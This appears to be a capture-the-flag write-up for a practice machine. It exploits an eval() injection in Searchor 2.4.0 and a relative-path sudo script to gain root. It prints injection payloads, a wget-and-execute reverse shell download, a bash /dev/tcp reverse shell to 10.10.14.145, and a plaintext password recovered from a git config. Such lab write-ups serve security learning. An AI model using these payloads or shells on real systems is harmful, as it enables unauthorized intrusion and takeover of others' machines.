## Recon

### nmap

```console
# Nmap 7.93 scan initiated Sat Apr  8 15:32:22 2023 as: nmap -p- --min-rate=7000 -oA nmap/alltcp 10.129.203.84
Nmap scan report for 10.129.203.84
Host is up (0.038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Web Service
```console
└─$ curl http://10.129.205.11 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="http://searcher.htb/">here</a>.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at 10.129.205.11 Port 80</address>
</body></html>
```

```text
└─$ tail /etc/hosts
...
10.129.205.11   searcher.htb
```

```html
└─$ curl http://searcher.htb 
...
            <p class="copyright">searcher.htb © 2023</p>
            <p class="copyright">Powered by <a style="color:black" target='_blank' href="https://flask.palletsprojects.com">Flask</a> and <a  style="color:black" target='_blank' href="https://github.com/ArjunSharda/Searchor">Searchor 2.4.0</a> </p><br>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/js/bootstrap.bundle.min.js"></script>

</footer>

</html>   
```

Searchor 2.4.0

Google search term:
`"Searchor" 2.4.0 vulnerability`

<https://security.snyk.io/package/pip/searchor>

Arbitrary Code Execution in versions before 2.4.2

<https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303>

Finding info about the patch on Github...
<https://github.com/ArjunSharda/Searchor/releases/tag/v2.4.2f>
<https://github.com/ArjunSharda/Searchor/pull/130>
<https://github.com/ArjunSharda/Searchor/pull/130/files>

```python
@click.argument("query")
def search(engine, query, open, copy):
    try:
        url = eval(
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
```

url = eval() is vulnerable and was replaced with:

```python
url = Engine[engine].search(query, copy_url=copy, open_web=open)
```

## Foothold

### Exploiting eval() function in python

<http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html>

#### Understanding the code and exploit

I created a mock version of the vulnerable method with a sample payload to understand how the URL string was formed

The goal of this payload is  to inject a custom command into the eval method using the parameter named 'query'. This requires us to force early termination of the call to `Engine.{engine}.search('` and force the eval function to ignore the remainder of the string, `, copy_url={copy}, open_web={open})`.

An attempt was made to inject a simple command, importing the os library and pinging our attacker machine, where tcpdump was run on the tunnel interface listening for ICMP packets.

```python
def main():
    engine = "Accuweather"
    query = "'),__import__('os').system('ping -c 4 0.0.0.0')#"
    copy = True
    open = True
    url = f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
    print(url)
    # eval(url)

main() 
```

The output:

`Engine.Accuweather.search(''),__import__('os').system('ping -c 4 0.0.0.0')#', copy_url=True, open_web=True)`

At this point we'll adjust the payload string as needed to have success locally in executing a command. We won't have the Engine library so we will replace this with a simple statement.

Performing the exploit locally:

```python
└─$ python3        
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.

>>> eval("print('test'),__import__('os').system('ping -c 4 0.0.0.0')#', copy_url=True, open_web=True)")
test
PING 0.0.0.0 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.029 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.032 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.048 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.031 ms

--- 0.0.0.0 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3049ms
rtt min/avg/max/mdev = 0.029/0.035/0.048/0.007 ms
(None, 0)
```

We formed a payload which successfully accomplishes command execution using the eval function

## Shell as svc

Utilizing Burp Suite, performing any search request in the browser and sending the request to repeater, we can modify the post data to be as follows, for a simple POC using ping

`engine=Accuweather&query='),__import__('os').system('ping -c 4 10.10.14.145')#`

We successfully receive the ping on our attacker machine

```console
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:22:32.321566 IP searcher.htb > 10.10.14.145: ICMP echo request, id 1, seq 1, length 64
17:22:32.321590 IP 10.10.14.145 > searcher.htb: ICMP echo reply, id 1, seq 1, length 64
...
```

Use msfvenom to create a stageless reverse tcp shell executable

```console
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.145 LPORT=4444 -f elf -o reverse.elf
```

Host a web server where the file can be retrieved, and a nc listener on port 4444

We will execute the following command string 
```
wget http://10.10.14.145/reverse.elf -O /tmp/r.elf;chmod +x /tmp/r.elf;/tmp/r.elf
```

URL encode key characters

```
wget+http%3a//10.10.14.145/reverse.elf+-O+/tmp/r.elf%3bchmod+%2bx+/tmp/r.elf%3b/tmp/r.elf
```

And place it into the post data

```
engine=Accuweather&query='),__import__('os').system('wget+http%3a//10.10.14.145/reverse.elf+-O+/tmp/r.elf%3bchmod+%2bx+/tmp/r.elf%3b/tmp/r.elf')#
```

This results in a successful reverse shell as user 'svc' where we can retrieve flag user.txt

## svc -> root

### File enumeration leading to credentials

Upon enumeration of svc's home directory, we find unique name 'cody' within .gitconfig

```console
svc@busqueda:/home/svc$ cat .gitconfig
cat .gitconfig
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks
```

Upon searching the filesystem for other files containing the text 'cody', we find file /var/www/app/.git/config

```console
svc@busqueda:/home/svc$ find / -type f -exec grep -l "cody" {} + 2>/dev/null

/var/lib/apt/lists/lk.archive.ubuntu.com_ubuntu_dists_jammy_universe_binary-amd64_Packages
/var/www/app/.git/config
```

The contents of the git config file contain what looks like credentials

```console
svc@busqueda:~$ cat /var/www/app/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

Using `su svc` with password `jh1usoih2bkjaspwe92` is successful

### Run-as root permissions on a custom script

Upon checking what commands we can run as root, there is one command

```console
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Running the script as root provides usage information

```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Commands `docker-ps` and `docker-inspect` don't produce any useful information, but command `full-checkup` is interesting as the name corresponds to bash script 'full-checkup.sh' in /opt/scripts

While running the command succeeds, it produces failure text

```console
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
```

However if we execute command `full-checkup` from within /opt/scripts, the command produces information

```console
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
[=] Docker conteainers
{
  "/gitea": "running"
}
{
  "/mysql_db": "running"
}

[=] Docker port mappings
{
...
```

This would seem to indicate that the custom script, 'system-checkup.py', isn't running the script 'full-checkup.sh' using an absolute path, but rather looking for the script in the current directory

We can test this by creating a file named 'full-checkup.sh' in our home directory and re-running the command

```console
svc@busqueda:~$ vim full-checkup.sh
svc@busqueda:~$ cat full-checkup.sh 
#!/bin/bash
echo test
svc@busqueda:~$ chmod +x full-checkup.sh 
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
test

[+] Done!
```

### Reverse shell using system-checkup.py

Adding a bash reverse shell command to our full-checkup.sh script produces a shell as root

```console
svc@busqueda:~$ vim full-checkup.sh
svc@busqueda:~$ cat full-checkup.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.145/4445 0>&1
svc@busqueda:~$ chmod +x full-checkup.sh 
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

```console
└─$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.10.14.145] from (UNKNOWN) [10.129.205.11] 49922
root@busqueda:/home/svc# 
```

## Beyond-root

### Vulnerability in system-checkup.py

With root access, upon examining system-checkup.py, we can confirm that it runs full-checkup.sh without using an absolute path

```python
root@busqueda:/home/svc# cat /opt/scripts/system-checkup.py
cat /opt/scripts/system-checkup.py
#!/bin/bash
import subprocess
import sys

actions = ['full-checkup', 'docker-ps','docker-inspect']

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output


def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
    
        except Exception as e:
            print('Something went wrong')
            exit(1)
    
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            

if __name__ == '__main__':

    try:
        action = sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError

    except IndexError:
        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
        print('')
        print('     docker-ps     : List running docker containers')
        print('     docker-inspect : Inpect a certain docker container')
        print('     full-checkup  : Run a full system checkup')
        print('')
        exit(1)
```

The vulnerable code:

```python
...
	elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
...
```
